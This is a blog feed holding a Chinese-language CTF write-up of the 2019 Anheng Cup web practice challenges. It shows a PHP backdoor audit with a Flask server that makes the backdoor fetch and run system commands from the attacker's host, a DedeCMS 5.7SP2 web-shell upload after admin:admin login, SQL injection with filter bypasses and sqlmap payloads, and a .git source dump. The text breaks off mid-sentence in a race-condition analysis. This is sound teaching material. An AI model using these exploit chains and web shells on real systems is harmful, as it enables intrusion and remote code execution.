<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anemone&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://anemone.top/"/>
  <updated>2019-10-17T13:14:29.021Z</updated>
  <id>http://anemone.top/</id>
  
  <author>
    <name>Anemone</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019“安恒杯”WEB安全测试秋季大赛练习题wp</title>
    <link href="http://anemone.top/ctf-2019%E2%80%9C%E5%AE%89%E6%81%92%E6%9D%AF%E2%80%9DWEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E7%BB%83%E4%B9%A0%E9%A2%98wp/"/>
    <id>http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/</id>
    <published>2019-10-17T12:38:34.000Z</published>
    <updated>2019-10-17T13:14:29.021Z</updated>
    
    <content type="html"><![CDATA[<h1 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h1><h2 id="0x01-路径遍历"><a href="#0x01-路径遍历" class="headerlink" title="0x01 路径遍历"></a>0x01 路径遍历</h2><p>打开地址看到路径遍历：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571126059065.png" alt="1571126059065"></p><p>在upload文件夹下发现后门和其源码</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571141073240.png" alt="1571141073240"></p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571141089817.png" alt="1571141089817"></p><h2 id="0x02-后门审计"><a href="#0x02-后门审计" class="headerlink" title="0x02 后门审计"></a>0x02 后门审计</h2><p>格式化后，进行代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// UA是md5(POST['pass'])</span></span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里产生一个url</span></span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    <span class="comment">// 从url获取文件内容，SSRF</span></span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// CodeInjection, may cause RCE, e.g.,&#123;"f":"system","d":"ls"&#125;</span></span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span>.$f.$g; <span class="comment">// url=http://pass[30:35]+pass[10:20], i.e.,url&lt;=15</span></span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;<span class="comment">/*...*/</span>&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其首先检查UA是否等于md5(POST[‘pass’])，接着取pass参数的两部分（pass长度要求大于40），组装成一个url，从该url获取一个json，再从json中的f变量获取函数名，d变量获取参数，并执行。</p><h2 id="0x03-构造恶意json"><a href="#0x03-构造恶意json" class="headerlink" title="0x03 构造恶意json"></a>0x03 构造恶意json</h2><p>按之前分析，最省事的方法是在自己服务器上一起个80服务，然后返回恶意json</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,jsonify</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">srv</span><span class="params">()</span>:</span></span><br><span class="line">    resp=dict(f=<span class="string">"system"</span>,d=<span class="string">"ls"</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(resp), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-后门利用"><a href="#0x04-后门利用" class="headerlink" title="0x04 后门利用"></a>0x04 后门利用</h2><p>最后一步，构造后门请求。首先，假设我服务器是216.126.239.124</p><p>先生成pass参数，画个草图好写代码：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571317896911.png" alt="1571317896911"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: url=<span class="string">"216.126.239.124"</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: _pass=<span class="string">'a'</span>*<span class="number">10</span>+url[<span class="number">5</span>:<span class="number">15</span>]+<span class="string">'b'</span>*<span class="number">10</span>+url[:<span class="number">5</span>]+<span class="string">'c'</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: _pass</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">'aaaaaaaaaa26.239.124bbbbbbbbbb216.1cccccccccc'</span></span><br></pre></td></tr></table></figure><p>再生成UA：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [4]: import hashlib</span><br><span class="line"></span><br><span class="line">In [5]: hashlib.md5(_pass.encode(&apos;ascii&apos;)).hexdigest()</span><br><span class="line">Out[5]: &apos;98a36c28cf36c4d8eeb8055a3538562e&apos;</span><br></pre></td></tr></table></figure><p>尝试发送payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://114.55.36.69:8020/upload/dama.php -X POST -H &quot;User-agent: 98a36c28cf36c4d8eeb8055a3538562e&quot; -d &apos;pass=aaaaaaaaaa26.239.124bbbbbbbbbb216.1cccccccccc&apos;</span><br></pre></td></tr></table></figure><p>可以看到payload生效了：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571144854091.png" alt="1571144854091"></p><p>找一下flag，需要修改我们服务器上的payload</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571145028036.png" alt="1571145028036"></p><p>然后找到目录<code>/var/www/html/flag.php</code>，cat得到flag：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571145141787.png" alt="1571145141787"></p><h1 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h1><h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><p>打开是一个用织梦CMS写的网站，拉到最下面看到版本疑似是v5.7sp2，想到织梦CMSV5.7SP2后台存在代码执行漏洞，详情见<a href="https://www.freebuf.com/vuls/164035.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/164035.html</a></p><h2 id="0x01-弱密码"><a href="#0x01-弱密码" class="headerlink" title="0x01 弱密码"></a>0x01 弱密码</h2><p>访问 <code>/dede/login.php</code>，看到管理登录页面，这里存在弱密码： admin:admin</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571126576237.png" alt="1571126576237"></p><h2 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h2><p> todo</p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>第一步，<code>GET /dede/tpl.php?action=upload</code>，获取csrftoken</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571127184086.png" alt="1571127184086"></p><p>第二步，<code>GET /dede/tpl.php?filename=anemone.lib.php&amp;action=savetagfile&amp;content=%3C?php%20var_dump(system($_GET[&#39;x&#39;]));?%3E&amp;token={csrf_token}</code>，上传一句话</p><p>第三步，<code>GET /include/taglib/anemone.lib.php?x=ls</code>，能RCE了：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128235789.png" alt="1571128235789"></p><h2 id="0x04-找flag"><a href="#0x04-找flag" class="headerlink" title="0x04 找flag"></a>0x04 找flag</h2><p><code>GET /include/taglib/anemone.lib.php?x=find%20/%20-name%20flag</code></p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128339477.png" alt="1571128339477"></p><p><code>GET /include/taglib/anemone.lib.php?x=cat%20/tmp/flagishere/flagishere/flagishere/flag</code></p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128497061.png" alt="1571128497061"></p><p>（flag被人改了吗？）</p><h1 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><p>尝试一些payload，看到有SQL注入：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571129558998.png" alt="1571129558998"></p><p>但是union,select会被过滤</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130055314.png" alt="1571130055314"></p><p>尝试<code>/*!select*/</code>绕过</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130170687.png" alt="1571130170687"></p><p>查库，得到news：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step2-1541417918841.png" alt="step2"></p><p>查表，得到admin表：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step3-1541417936188.png" alt="step3"></p><p>查列，得到flag列</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step4.png" alt="step4"></p><p>查记录，得到flag：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step5.png" alt="step5"></p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>尝试sqlmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -r D:\MEGAsync\mooctest2019exer\new-news.txt  --level 3 --risk 3</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 233 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: <span class="comment">#1* ((custom) POST)</span></span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: word=-2704<span class="string">' OR 5368=5368-- AyLy&amp;number=5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)</span></span><br><span class="line"><span class="string">    Payload: word=test'</span> OR SLEEP(5)-- pJuo&amp;number=5</span><br></pre></td></tr></table></figure><h1 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h1><p>看到<code>/index.php?url=upload</code>可以想到url可能存在文件包含/SSRF/URLRedirect问题：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131861906.png" alt="1571131861906"></p><p>base64decode后得到flag</p><h1 id="新闻搜索"><a href="#新闻搜索" class="headerlink" title="新闻搜索"></a>新闻搜索</h1><p>尝试注入</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130487146.png" alt="1571130487146"></p><p>一步步注入得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">word=test&apos; union select 1,2,3 %23&amp;number=5</span><br></pre></td></tr></table></figure><h1 id="一个hackerone的有趣的漏洞的复现的题目"><a href="#一个hackerone的有趣的漏洞的复现的题目" class="headerlink" title="一个hackerone的有趣的漏洞的复现的题目"></a>一个hackerone的有趣的漏洞的复现的题目</h1><h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><p>扫描发现源代码泄露：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130863836.png" alt="1571130863836"></p><p>还原源代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./Dumper/gitdumper.sh http://114.55.36.69:8023/.git/ /temp/hackerone</span><br><span class="line">./Extractor/extractor.sh /temp/hackerone /temp/hackerone</span><br></pre></td></tr></table></figure><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>从index.php:11-14看到，如果是管理员，则可以拿到flag：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571212369176.png" alt="1571212369176"></p><p>跟is_admin(class.user.php):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">       <span class="comment">// 检查用户名是否合法</span></span><br><span class="line"><span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">       <span class="comment">//获取userfile，其中有一属性为is_admin</span></span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line"><span class="keyword">if</span>($user[<span class="string">'is_admin'</span>] === <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate_username</span><span class="params">($username)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($username) &gt; <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^[_\.\-0-9a-zA-Z]+$/i'</span>, $username)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_attrs</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">$users = zUserFile::get_all_users();</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $users[<span class="string">'attrs'</span>][$username];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>is_admin没有突破口，但是跟流程的时候，发现注册用户有切换用户功能，看一下切换用户逻辑怎么做的：</p><p>switch.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$userObj = <span class="keyword">new</span> zUser();</span><br><span class="line">$user = zUserFile::get_attrs($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$users = zUserFile::get_relate_users($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($username != <span class="keyword">false</span> &amp;&amp; zUserFile::is_exists($username))&#123;</span><br><span class="line">$to_user = zUserFile::get_attrs($username);</span><br><span class="line">    <span class="comment">// 当前用户和目标用户以通过邮箱验证，并且当前用户邮箱与目标用户邮箱一致</span></span><br><span class="line"><span class="keyword">if</span>($user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $to_user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $user[<span class="string">'email'</span>] === $to_user[<span class="string">'email'</span>])&#123;</span><br><span class="line">$userObj-&gt;login2($username);</span><br><span class="line">header(<span class="string">'Location: ./'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login2</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">$username = trim($username);</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题转化为把自己邮箱弄成admin邮箱，继续审计绑定邮箱过程（chgemail.php、class.user.php）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(!chktoken())&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID REQUEST'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$email = <span class="keyword">isset</span>($_POST[<span class="string">'email'</span>])?trim($_POST[<span class="string">'email'</span>]):<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($userObj-&gt;chg_email($_SESSION[<span class="string">'username'</span>], $email))<span class="comment">//修改绑定邮箱</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'SUCCESS'</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'FAILED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg_email</span><span class="params">($username, $email)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($email == <span class="keyword">false</span> || !zUserFile::validate_email($email))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line">$old_email = $user[<span class="string">'email'</span>];</span><br><span class="line">$emails = zUserFile::get_emails();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($emails[$old_email]))&#123;</span><br><span class="line">$emails[$old_email] = array_diff($emails[$old_email], <span class="keyword">array</span>($username));</span><br><span class="line"><span class="keyword">if</span>($emails[$old_email] == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">unset</span>($emails[$old_email]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 重绑定邮箱后，email_verify被重置, token被重置</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">0</span>);</span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email'</span>, $email);</span><br><span class="line">zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);</span><br><span class="line">$us = @is_array($emails[$email])?$emails[$email]:<span class="keyword">array</span>();</span><br><span class="line">$emails[$email] = array_merge($us, <span class="keyword">array</span>($username));</span><br><span class="line"><span class="keyword">return</span> zUserFile::update_emails($emails);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate_email</span><span class="params">($email)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($email) &gt; <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> filter_var($email, FILTER_VALIDATE_EMAIL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说重新绑定邮箱时，需要重新发邮件，然后验证，再看下验证部分代码（verify.php）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'token'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line">$token = <span class="keyword">isset</span>($_GET[<span class="string">'token'</span>])?trim($_GET[<span class="string">'token'</span>]):<span class="string">''</span>;</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;\</span><br><span class="line">    <span class="comment">// token和username不为空</span></span><br><span class="line"><span class="keyword">if</span>($token == <span class="keyword">false</span> || $username == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID INPUT'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($userObj-&gt;verify_email($username, $token))&#123;</span><br><span class="line">$userObj-&gt;login($username);</span><br><span class="line">header(<span class="string">'location: ./'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID TOKEN OR USERNAME'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class.user.php::zUser::verify_email</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_email</span><span class="params">($username, $token)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$token = trim($token);</span><br><span class="line"><span class="keyword">if</span>($token == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line">$real_token = $user[<span class="string">"token"</span>];</span><br><span class="line">        <span class="comment">// 验证提交的token是否和数据库里的用户对应的token一致</span></span><br><span class="line"><span class="keyword">if</span>(md5($real_token) !== md5($token))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// token被重置</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// Condition Race</span></span><br><span class="line">        <span class="comment">// verify设为1</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>审到这里想到条件竞争，如果走正常重置邮箱的流程，程序执行到<code>zUserFile::update_attr($username, &#39;token&#39;, 